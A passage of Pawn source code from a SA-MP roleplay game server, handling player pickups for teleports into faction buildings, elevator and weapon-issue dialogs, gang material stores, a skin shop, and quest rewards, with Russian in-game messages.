	{
	    ShowPlayerDialogEx(playerid, 1014, DIALOG_STYLE_LIST, "Лифт", "{FFFFFF}Крыша\nЭтаж 2\nЭтаж 1\nГараж", "Далее", "Выйти");
	}
	else if(pickupid == lspd[4])
	{
	    ShowPlayerDialogEx(playerid, 1014, DIALOG_STYLE_LIST, "Лифт", "{FFFFFF}Крыша\nЭтаж 2\nЭтаж 1\nГараж", "Далее", "Выйти");
	}
	else if(pickupid == lspd[5])
	{
	    ShowPlayerDialogEx(playerid, 1014, DIALOG_STYLE_LIST, "Лифт", "{FFFFFF}Крыша\nЭтаж 2\nЭтаж 1\nГараж", "Далее", "Выйти");
	}
	else if(pickupid == lspd[6])
	{
	    LoadInterior(playerid);
	    SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,634.2488,1388.2341,3020.8884);
		SetPlayerFacingAngle(playerid, 251.0036);
		SetPlayerVirtualWorld(playerid, 4);
	}
	else if(pickupid == lspd[7])
	{
	    LoadInterior(playerid);
	    SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,1218.0693,1335.7468,3014.4912);
		SetPlayerFacingAngle(playerid, 90.8414);
		SetPlayerVirtualWorld(playerid, 4);
	}
	else if(pickupid == sf[4])
	{
		SetPlayerInterior(playerid,6);
		SetPlayerPos(playerid,316.3837,-167.8547,999.5938);
		SetPlayerFacingAngle(playerid, 34.3574);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(pickupid == sf[0])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-1606.4532,674.2636,-5.2422);
		SetPlayerFacingAngle(playerid, 357.2527);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == sf[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-1590.8289,716.0479,-5.2422);
		SetPlayerFacingAngle(playerid, 269.9364);
		SetPlayerVirtualWorld(playerid, 0);
		SetPVarInt(playerid, "inUchastok", 0);
	}
	else if(pickupid == sf[2])
	{
		SetPlayerInterior(playerid,10);
		SetPlayerPos(playerid,217.3147,121.3382,999.0156);
		SetPlayerFacingAngle(playerid, 272.8898);
		SetPVarInt(playerid, "inUchastok", 1);
	}
	else if(pickupid == sf[3])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-1605.9866,718.9982,12.0476);
		SetPlayerFacingAngle(playerid, 359.1870);
		SetPVarInt(playerid, "inUchastok", 0);
	}
	else if(pickupid == sf[5])
	{
		SetPlayerInterior(playerid,10);
		SetPlayerPos(playerid,246.0613,110.8390,1003.2188);
		SetPlayerFacingAngle(playerid, 358.6587);
	    SetPVarInt(playerid, "inUchastok", 1);
	}
	else if(pickupid == armijavhod)
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,156.4952,1945.6383,20.0000);
		SetPlayerFacingAngle(playerid, 183.1738);
	}
	else if(pickupid == armijavihod)
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,139.5660,1936.6910,19.2734);
		SetPlayerFacingAngle(playerid, 183.1738);
	}
	else if(pickupid == lvpdpic[0])
	{
		SetPlayerInterior(playerid,3);
		SetPlayerVirtualWorld(playerid, 122);
		SetPlayerPos(playerid,238.5033,141.1578,1003.0234);
		SetPlayerFacingAngle(playerid, 359.1617);
		SetPVarInt(playerid, "inUchastok", 1);
	}
	else if(pickupid == lvpdpic[1])
	{
	 	SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,2295.1934,2451.8459,10.8203);
		SetPlayerFacingAngle(playerid, 94.8742);
		SetPVarInt(playerid, "inUchastok", 0);
	}
	else if(pickupid == lvpdpic[2])
	{
		SetPlayerInterior(playerid,3);
		SetPlayerVirtualWorld(playerid, 122);
		SetPlayerPos(playerid,288.7445,169.2445,1007.1719);
		SetPlayerFacingAngle(playerid, 9.7598);
		SetPVarInt(playerid, "inUchastok", 1);
	}
	else if(pickupid == lvpdpic[3])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,2340.1965,2455.9792,14.9688);
		SetPlayerFacingAngle(playerid, 178.3347);
		SetPVarInt(playerid, "inUchastok", 0);
	}
	else if(pickupid == lvpdpic[4])
	{
		ShowPlayerDialogEx(playerid,8240,DIALOG_STYLE_MSGBOX, "Вход", "Куда вы хотите войти?", "Склад", "На крышу");
	}
	else if(pickupid == lvpdpic[5])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,2293.3225,2468.6162,10.8203);
		SetPlayerFacingAngle(playerid, 93.6957);
	}
	else if(pickupid == lvpdpic[6])
	{
		ShowPlayerDialogEx(playerid,8241,DIALOG_STYLE_MSGBOX, "Вход", "Куда Вы хотите войти?", "Склад", "Вниз");
	}
	else if(pickupid >= chekmatlva[0] && pickupid <= chekmatlva[9])
	{
		if (!IsAGang(playerid)) return SCM(playerid,COLOR_GREY, " Вы не бандит");
		if(armmatbi <= 100) return SCM(playerid,COLOR_GRAD1, " На складе нет материалов");
		if(PlayerInfo[playerid][pMats] > 500) return SCM(playerid,COLOR_GRAD1, " У вас на руках уже есть материалы");
		SCM(playerid, 0x6495EDFF, " Вы взяли несколько комплектов");
		armmatbi -= 500;
		new strings1[50];
		format(strings1,sizeof(strings1), "{33AA33}Склад армии ЛВ: {FFFFFF}%i", armmatbi);
		UpdateDynamic3DTextLabelText(LvaLable, 0xFFFF00FF, strings1);
		if(PlayerInfo[playerid][pMember] == BestGang) PlayerInfo[playerid][pMats] = 1000;
		else PlayerInfo[playerid][pMats] = 500;
	}
	else if(pickupid >= chekmats[0]&& pickupid <= chekmats[1])
	{
		if (!IsAGang(playerid)) return SCM(playerid,COLOR_GREY, " Вы не бандит");
		if(armmatsf <= 100) return SCM(playerid,COLOR_GRAD1, " На складе нет материалов");
		if(PlayerInfo[playerid][pMats] > 500) return SCM(playerid,COLOR_GRAD1, " У вас на руках уже есть материалы");
		SCM(playerid, 0x6495EDFF, "Вы взяли несколько комплектов");
		armmatsf -= 500;
		if(PlayerInfo[playerid][pMember] == BestGang) PlayerInfo[playerid][pMats] = 1000;
		else PlayerInfo[playerid][pMats] = 500;
	}
	else if(pickupid >= mushroom[0]&& pickupid <= mushroom[1])
	{
		format(string, 40, " %s срезал(а) гриб", PlayerInfo[playerid][pName]);
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		PlayerInfo[playerid][pMushrooms] += 1;
		ClearAnimations(playerid);
		ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 6.1, 0, 0, 0, 0, 0,1);
		format(string,160, " Вы нашли гриб: \"%s\". Грибов собрано: %i штук",GribNames[random(3)],PlayerInfo[playerid][pMushrooms]);
		SCM(playerid,-1,string);
	}
	else if(pickupid == buygunzakon[0])
	{
		if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 2)
		{
			ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
			"Оружие\tПатроны\n\
			Desert Eagle\t[21п]\n\
			Shotgun\t[30п]\n\
			MP5\t[90п]\n\
			M4A1\t[150п]\n\
			Rifle\t[30п]\n\
			Броня\n\
			Спец оружие\n",
			"Взять", "Отмена");
		}
		else
		{
			 SCM(playerid, COLOR_GREY, "Вы не состоите в этой организации");
		}
	}
	else if(pickupid == buygunzakon[1])
	{
		if((GetPVarInt(playerid,"Fraction_Duty") == 1) && (PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2))
		{
			ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
			"Оружие\tПатроны\n\
			Desert Eagle\t[21п]\n\
			Shotgun\t[30п]\n\
			MP5\t[90п]\n\
			M4A1\t[150п]\n\
			Rifle\t[30п]\n\
			Броня\n\
			Спец оружие\n",
			"Взять", "Отмена");
		}
		else
		{
			 SCM(playerid, COLOR_GREY, "Вы не состоите в этой организации");
		}
	}
	else if(pickupid == buygunzakon[3])
	{
		if((GetPVarInt(playerid,"Fraction_Duty") == 1) && (PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pMember] == 2))
		{
			ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
			"Оружие\tПатроны\n\
			Desert Eagle\t[21п]\n\
			Shotgun\t[30п]\n\
			MP5\t[90п]\n\
			M4A1\t[150п]\n\
			Rifle\t[30п]\n\
			Броня\n\
			Спец оружие\n",
			"Взять", "Отмена");
		}
		else
		{
			 SCM(playerid, COLOR_GREY, "Вы не состоите в этой организации");
		}
	}
	else if(pickupid == buygunzakon[2])
	{
		if((GetPVarInt(playerid,"Fraction_Duty") == 1) && (PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 2))
		{
			ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
			"Оружие\tПатроны\n\
			Desert Eagle\t[21п]\n\
			Shotgun\t[30п]\n\
			MP5\t[90п]\n\
			M4A1\t[150п]\n\
			Rifle\t[30п]\n\
			Броня\n\
			Спец оружие\n",
			"Взять", "Отмена");
		}
		else
		{
			 SCM(playerid, COLOR_GREY, "Вы не состоите в этой организации");
		}
	}
	else if(pickupid >= serdce[0]&& pickupid <= serdce[2])
	{
		if(PlayerInfo[playerid][pLevel] == 1 || PlayerInfo[playerid][pLevel] == 2)
		{
			SetPlayerHealthAC(playerid, 100);
			PlayerInfo[playerid][pHP] = 100;
			PlayerInfo[playerid][pSatiety] = 100;
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pHP = '%f' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pHP], PlayerInfo[playerid][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
		}
		else
		{
			SCM(playerid, 0x9f0000aa, " Только для новичков(1 и 2 лвл)");
		}
	}
	else if(pickupid == serdce[3])
	{
		if(PlayerInfo[playerid][pLevel] == 1 || PlayerInfo[playerid][pLevel] == 2 || PlayerInfo[playerid][pMember] == 7 || PlayerInfo[playerid][pLeader] == 7)
		{
			SetPlayerHealthAC(playerid, 100);
			PlayerInfo[playerid][pHP] = 100;
			PlayerInfo[playerid][pSatiety] = 100;
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pHP = '%f' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pHP], PlayerInfo[playerid][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
		}
		else
		{
			SCM(playerid, 0x9f0000aa, " Только для новичков(1 и 2 лвл)");
		}
	}
	else if(pickupid == cashs)
	{
		if(Works[playerid] == false) return true;
		if(JobAmmount[playerid] == 0) return SCM(playerid,COLOR_GREY, " Вы ничего не заработали");
		PlayerInfo[playerid][pCash] +=JobAmmount[playerid]*25;
		format(YCMDstr, sizeof(YCMDstr), "~g~+%d$", JobAmmount[playerid]*25);
		GameTextForPlayer(playerid, YCMDstr, 3000, 1);
		SCM(playerid,COLOR_GREEN,"Спасибо за работу, приходите еще!");
		JobAmmount[playerid] = 0; Employer[playerid] = 999;
		return true;
	}
	else if(pickupid == clothes)
	{
		ShowPlayerDialogEx(playerid,4423,DIALOG_STYLE_MSGBOX, "Раздевалка", "Вы хотите начать рабочий день , или закончить?", "Начать", "Закончить");
	}
	else if(pickupid == skinshop[0] || pickupid == skinshop[2])
	{
		if(PlayerInfo[playerid][pSex] != 1) return SCM(playerid, -1, " Вы ошиблись кабинкой");
		if(!GetPVarInt(playerid,"Fraction_Duty"))
		{
	        for(new i; i < 7; i++) TextDrawShowForPlayer(playerid, Select_Skin_TD[i]);
		    PlayerTextDrawShow(playerid, Select_Skin_PTD[playerid][0]);
		    PlayerTextDrawShow(playerid, Select_Skin_PTD[playerid][1]);
			SelectTextDraw(playerid, 0xF81414);
			SetPlayerInterior(playerid,5);
			SCM(playerid, COLOR_RED, " Используйте клавишу 'Быстрый бег' (пробел по умолчанию)");
			SCM(playerid, COLOR_RED, " Используйте клавишу 'Вверх,вниз' (W,S по умолчанию)");
			SetPlayerPos(playerid,222.3489,-8.5845,1002.2109);
			SetPlayerFacingAngle(playerid, 266.7302);
			SetPlayerCameraPos(playerid,225.3489,-8.5845,1002.2109);
			SetPlayerCameraLookAt(playerid,222.3489,-8.5845,1002.2109);
			TogglePlayerControllable(playerid, 0);
			ChangeSkin[playerid] = 0;
			new skin = Random(2,200);
			SetPlayerVirtualWorld(playerid,skin);
			SetPlayerSkin(playerid,SkinMen[ChangeSkin[playerid]][0]);
			if(booston == 0)
			{
	             format(string, 127,"$%i",SkinMen[ChangeSkin[playerid]][1]);
		         PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
			}
			if(booston == 1)
			{
	             format(string, 127,"$%i",SkinMen[ChangeSkin[playerid]][1]-SkinMen[ChangeSkin[playerid]][1]*20/100);
	             PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
			}
			return true;
		}
		else if(PlayerInfo[playerid][pMember] > 0) return SCM(playerid, -1, "Вы на рабочем месте ((Переодеться можно у себе на базе))");
	}
	else if(pickupid == skinshop[1] || pickupid == skinshop[3])
	{
		if(PlayerInfo[playerid][pSex] != 2) return SCM(playerid, -1, " Вы ошиблись кабинкой");
		if(!GetPVarInt(playerid,"Fraction_Duty"))
		{
	        for(new i; i < 7; i++) TextDrawShowForPlayer(playerid, Select_Skin_TD[i]);
		    PlayerTextDrawShow(playerid, Select_Skin_PTD[playerid][0]);
		    PlayerTextDrawShow(playerid, Select_Skin_PTD[playerid][1]);
			SelectTextDraw(playerid, 0xF81414);
			SetPlayerInterior(playerid,5);
			SCM(playerid, COLOR_RED, " Используйте клавишу 'Быстрый бег' (пробел по умолчанию)");
			SCM(playerid, COLOR_RED, " Используйте клавишу 'Вверх,вниз' (W,S по умолчанию)");
			SetPlayerPos(playerid,222.3489,-8.5845,1002.2109);
			SetPlayerFacingAngle(playerid, 266.7302);
			SetPlayerCameraPos(playerid,225.3489,-8.5845,1002.2109);
			SetPlayerCameraLookAt(playerid,222.3489,-8.5845,1002.2109);
			TogglePlayerControllable(playerid, 0);
			ChangeSkin[playerid]=0;
			new skin = Random(2,200);
			SetPlayerVirtualWorld(playerid,skin);
			if(ChangeSkin[playerid]	== sizeof(SkinMale)-1) ChangeSkin[playerid] = 0;
			else ChangeSkin[playerid]++;
			SetPlayerSkin(playerid,SkinMale[ChangeSkin[playerid]][0]);
			if(booston == 0)
			{
	             format(string, 127,"$%i",SkinMale[ChangeSkin[playerid]][1]);
	             PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
			}
			if(booston == 1)
			{
	             format(string, 127,"$%i",SkinMale[ChangeSkin[playerid]][1]-SkinMale[ChangeSkin[playerid]][1]*20/100);
	             PlayerTextDrawSetString(playerid, Select_Skin_PTD[playerid][1], string);
			}
		}
		else if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] >= 1) return SCM(playerid, -1, "Вы на рабочем месте ((Переодеться можно у себе на базе))");
	}
	else if(pickupid == marenter[0])
	{
		LoadInterior(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,866.5653,315.2563,1078.4357);
		SetPlayerFacingAngle(playerid, 0.6676);
		SetPlayerVirtualWorld(playerid, 1);
		if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 5)
		{
			PlayerPlaySound(playerid, 4201, 0.0, 0.0, 0);
			ShowPlayerDialogEx(playerid,13376,DIALOG_STYLE_MSGBOX,"Задание","Поздравляем\nСюжетная линия ''Гость'' пройдена!"
			,"Готово","");
			GameTextForPlayer(playerid, "~g~+4000$", 2000, 1);
			PlayerInfo[playerid][pCash] += 4000;
			if(PlayerInfo[playerid][pLevel] == 1) SCM(playerid, COLOR_LIGHTGREEN, " Поздравляем! Ваш лвл повысился");
			if(PlayerInfo[playerid][pLevel] == 1) PlayerInfo[playerid][pLevel] = 2;
			if(PlayerInfo[playerid][pLevel] == 2) PlayerInfo[playerid][pExp] = 0;
			PlayerInfo[playerid][pQuestL] = 0;
			PlayerInfo[playerid][pQuest] = 0;
			PlayerInfo[playerid][pQuestF] = 0;
			PlayerInfo[playerid][pQuestP] = 0;
			PlayerInfo[playerid][pQuestPF] = 0;
			SCM(playerid,0x30a0a7aa," Задание выполнено");
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pLevel = '%i', pExp = '%i', pQuestL = '%i', pQuest = '%i', pQuestF = '%i', pQuestP = '%i', pQuestPF = '%i' WHERE name = '%e'",
	        PlayerInfo[playerid][pCash], PlayerInfo[playerid][pLevel], PlayerInfo[playerid][pExp], PlayerInfo[playerid][pQuestL], PlayerInfo[playerid][pQuest], PlayerInfo[playerid][pQuestF], PlayerInfo[playerid][pQuestP], PlayerInfo[playerid][pQuestPF], PlayerInfo[playerid][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
		}
	}
	else if(pickupid == marenter[1])
	{
		LoadInterior(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,848.1432,337.6282,1081.7656);
		SetPlayerFacingAngle(playerid, 180.3090);
		SetPlayerVirtualWorld(playerid, 1);
		if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 5)
		{
			PlayerPlaySound(playerid, 4201, 0.0, 0.0, 0);
			ShowPlayerDialogEx(playerid,13376,DIALOG_STYLE_MSGBOX,"Задание","Поздравляем\nСюжетная линия ''Гость'' пройдена!"
			,"Готово","");
			GameTextForPlayer(playerid, "~g~+4000$", 2000, 1);
			PlayerInfo[playerid][pCash] += 4000;
			if(PlayerInfo[playerid][pLevel] == 1) SCM(playerid, COLOR_LIGHTGREEN, " Поздравляем! Ваш лвл повысился");
			if(PlayerInfo[playerid][pLevel] == 1) PlayerInfo[playerid][pLevel] = 2;
			if(PlayerInfo[playerid][pLevel] == 2) PlayerInfo[playerid][pExp] = 0;
			PlayerInfo[playerid][pQuestL] = 0;
			PlayerInfo[playerid][pQuest] = 0;
			PlayerInfo[playerid][pQuestF] = 0;
			PlayerInfo[playerid][pQuestP] = 0;
			PlayerInfo[playerid][pQuestPF] = 0;
			SCM(playerid,0x30a0a7aa," Задание выполнено");
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pLevel = '%i', pExp = '%i', pQuestL = '%i', pQuest = '%i', pQuestF = '%i', pQuestP = '%i', pQuestPF = '%i' WHERE name = '%e'",
	        PlayerInfo[playerid][pCash], PlayerInfo[playerid][pLevel], PlayerInfo[playerid][pExp], PlayerInfo[playerid][pQuestL], PlayerInfo[playerid][pQuest], PlayerInfo[playerid][pQuestF], PlayerInfo[playerid][pQuestP], PlayerInfo[playerid][pQuestPF], PlayerInfo[playerid][pName]);
	        mysql_function_query(DATABASE,QUERY,false,"","");
		}
	}
	else if(pickupid == marenter[2])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,1410.9028,-1790.6768,14.1640);
		SetPlayerFacingAngle(playerid, 95.6792);
	}
	else if(pickupid == maria)
	{
		LoadInterior(playerid);
		SetPlayerVirtualWorld(playerid,1);
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,870.3796,352.8890,1081.7677);
		SetPlayerFacingAngle(playerid, 179.0577);
	}
	else if(pickupid == mariaexit)
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,1435.1095,-1789.6874,33.4297);
		SetPlayerFacingAngle(playerid, 87.9211);
	}
	else if(pickupid == marexit)
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,1480.8832,-1769.0471,18.7958);
		SetPlayerFacingAngle(playerid, 0.3133);
		DisablePlayerCheckpoint(playerid);
		PicCP[playerid] = 0;
		CP[playerid] = 0;
	}
	else if(pickupid == rifa[0])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,2185.96,-1811.94,13.55);
		SetPlayerFacingAngle(playerid, 400);
	}
	else if(pickupid == rifa[1])
	{
		SetPlayerInterior(playerid,8);
		SetPlayerVirtualWorld(playerid, 63);
		SetPlayerPos(playerid,2807.2239,-1172.5020,1025.5703);
		SetPlayerFacingAngle(playerid, 360);
	}
	else if(pickupid == vagospic[0])
	{
	    LoadInterior(playerid);
		SetPlayerInterior(playerid,4);
		SetPlayerVirtualWorld(playerid, 75);
		SetPlayerPos(playerid,2806.8708,-1603.3502,-36.5231);
		SetPlayerFacingAngle(playerid, 500);
		TogglePlayerControllable(playerid, 0);
	}
	else if(pickupid == vagospic[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,2774.2017,-1628.0233,12.1775);
		SetPlayerFacingAngle(playerid, 330.4577);
	}
	else if(pickupid == grooveenter)
	{
		SetPlayerInterior(playerid,3);
		SetPlayerPos(playerid,2496.1580,-1694.5743,1014.7422);
		SetPlayerFacingAngle(playerid,177.8856);
		SetPlayerVirtualWorld(playerid, 1);
	}
	else if(pickupid == grooveexit)
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,2495.1199,-1688.3727,13.7653);
		SetPlayerFacingAngle(playerid, 4.2929);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == aztecpic[0])
	{
		SetPlayerInterior(playerid,8);
		SetPlayerVirtualWorld(playerid, 36);
		SetPlayerPos(playerid,-42.31,1408.18,1084.43);
		SetPlayerFacingAngle(playerid, 1000);
	}
	else if(pickupid == aztecpic[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,1667.4498,-2108.3840,13.8906);
		SetPlayerFacingAngle(playerid, 178.1356);
	}
	else if(pickupid == bankpic[0])
	{
		LoadInterior(playerid);
		SetPVarInt(playerid, "in_bank", 1);
		SetPlayerVirtualWorld(playerid, 3);
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,1398.0267,-1674.0280,39.5649);
		SetPlayerFacingAngle(playerid, 180.7531);
	}
	else if(pickupid == bankpic[1])
	{
	    DeletePVar(playerid, "in_bank");
		if(ebanksf[playerid] == 1)
		{
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerPos(playerid,-2170.4336,252.5737,35.3351);
			SetPlayerFacingAngle(playerid, 267.6245);
			ebanksf[playerid] = 0;
			SetCameraBehindPlayer(playerid);
			return true;
		}
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,1414.14,-1702.78,13.5395);
		SetPlayerFacingAngle(playerid, 209.7472);
	}
	else if(pickupid == bankpic[2])
	{
	    LoadInterior(playerid);
	    ebanksf[playerid] = 1;
	    SetPVarInt(playerid, "in_bank", 1);
		SetPlayerInterior(playerid, 0);
		SetPlayerVirtualWorld(playerid, 3);
		SetPlayerPos(playerid,1398.0267,-1674.0280,39.5649);
		SetPlayerFacingAngle(playerid, 180.7531);
	}
	/*else if(pickupid == banksf)
	{
		ebanksf[playerid] = 1;
		SetPlayerInterior(playerid, 0);
		SetPlayerPos(playerid,2307.6462,-15.7474,26.7496);
		SetPlayerFacingAngle(playerid, 281.2246);
	}*/
	else if(pickupid == ballasvhod[0])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerPos(playerid,2647.9932,-2021.5747,13.5469);
		SetPlayerFacingAngle(playerid, 100);
	}
	else if(pickupid == ballasvhod[1])
	{
		SetPlayerInterior(playerid,6);
		SetPlayerVirtualWorld(playerid, 34);
		SetPlayerPos(playerid,-68.6311,1353.8743,1080.2109);
		SetPlayerFacingAngle(playerid, 100);
	}
	else if(pickupid == sklad[0])
	{
		SetPlayerInterior(playerid,6);
		SetPlayerPos(playerid,316.9104,-168.6356,999.5938);
		SetPlayerFacingAngle(playerid, 355.8037);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == sklad[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,338.3804,1949.1343,22.0174);
		SetPlayerFacingAngle(playerid, 92.2485);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == skladfbi)
	{
		SetPlayerInterior(playerid,6);
		SetPlayerPos(playerid,316.9104,-168.6356,999.5938);
		SetPlayerFacingAngle(playerid, 355.8037);
		SetPlayerVirtualWorld(playerid, 130);
	}
	else if(pickupid == skladfbi2)
	{
		SetPlayerInterior(playerid, 3);
		SetPlayerPos(playerid,-2472.7883,513.3563,1039.1460);
		SetPlayerFacingAngle(playerid, 0);
		SetPlayerVirtualWorld(playerid, 130);
	}
	else if(pickupid == sklad[2])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,-1370.39,498.79,11.20);
		SetPlayerFacingAngle(playerid, 270.0000);
		SetPlayerVirtualWorld(playerid, 0);
	}
	else if(pickupid == sklad[3])
	{
		SetPlayerInterior(playerid,6);
		SetPlayerPos(playerid,316.9104,-168.6356,999.5938);
		SetPlayerFacingAngle(playerid, 355.8037);
		SetPlayerVirtualWorld(playerid, 3);
	}
	else if(pickupid == lsaammo)
	{
		if(GetPVarInt(playerid,"Fraction_Duty") && (PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pMember] == 2))
		{
			SetPVarInt(playerid,"lsaammo",1);
	        ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
		    "Оружие\tПатроны\n\
		    Desert Eagle\t[21п]\n\
		    Shotgun\t[30п]\n\
		    MP5\t[90п]\n\
		    M4A1\t[150п]\n\
		    Rifle\t[30п]\n\
		    Броня\n\
		    Спец оружие\n",
		    "Взять", "Отмена");
		}
		else
		{
			SCM(playerid, 0x9f0000aa, " Вы не силовик");
		}
	}
	else if(pickupid == lsamat)
	{
	//	if(!IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Вы не бандит");
		SCM(playerid, 0x6ab1ffaa, " Склад с оружием. Чтобы украсть комплект, используйте /materials get");
	}
	else if(pickupid == gummeria)
	{
	    if(GetPVarInt(playerid,"Fraction_Duty") && (PlayerInfo[playerid][pMember] == 7))
		{
	        ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
		    "Оружие\tПатроны\n\
		    Desert Eagle\t[21п]\n\
		    Shotgun\t[30п]\n\
		    MP5\t[90п]\n\
		    M4A1\t[150п]\n\
		    Rifle\t[30п]\n\
		    Броня\n\
		    Спец оружие\n",
		    "Взять", "Отмена");
		}
		else
		{
			SCM(playerid, 0x9f0000aa, " Вы не состоите в этой организации");
		}
	}
	else if(pickupid == gunarm[0])
	{
	    if(GetPVarInt(playerid,"Fraction_Duty") && (PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pMember] == 2))
		{
	        ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
		    "Оружие\tПатроны\n\
		    Desert Eagle\t[21п]\n\
		    Shotgun\t[30п]\n\
		    MP5\t[90п]\n\
		    M4A1\t[150п]\n\
		    Rifle\t[30п]\n\
		    Броня\n\
		    Спец оружие\n",
		    "Взять", "Отмена");
		}
		else
		{
			SCM(playerid, 0x9f0000aa, " Вы не силовик");
		}
	}
	else if(pickupid == gunarm[1])
	{
		if(GetPVarInt(playerid,"Fraction_Duty") && (PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pMember] == 2))
		{
	        ShowPlayerDialog(playerid, 5225, DIALOG_STYLE_TABLIST_HEADERS, "Взять оружие",
		    "Оружие\tПатроны\n\
		    Desert Eagle\t[21п]\n\
		    Shotgun\t[30п]\n\
		    MP5\t[90п]\n\
		    M4A1\t[150п]\n\
		    Rifle\t[30п]\n\
		    Броня\n\
		    Спец оружие\n",
		    "Взять", "Отмена");
		}
		else
		{
			SCM(playerid, 0x9f0000aa, " Вы не силовик");
		}
	}
	else if(pickupid == zonaa)
	{
		if(PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pLeader] == 19 || proverkaforma[playerid] == 1)
		{
			SetPlayerInterior(playerid,0);
			SetPlayerPos(playerid,279.4233,1835.0087,17.6481);
			SetPlayerFacingAngle(playerid, 17.2727);
		}
		else
		{
			SCM(playerid, -1, " У вас нет ключа!");
		}
	}
	else if(pickupid == zona)
	{
		if(PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pLeader] == 19 || proverkaforma[playerid] == 1)
		{
			SetPlayerInterior(playerid,0);
			SetPlayerPos(playerid,291.8297,1836.4666,17.6406);
			SetPlayerFacingAngle(playerid, 346.3333);
		}
		else
		{
			SCM(playerid, -1, " У вас нет ключа!");
		}
	}
	else if(pickupid >= PickupRazd[0] && pickupid <= PickupRazd[31])
	{
		new bouse = PlayerInfo[playerid][pPHouseKey];
		if (GetPlayerVirtualWorld(playerid) != bouse+50) return true;
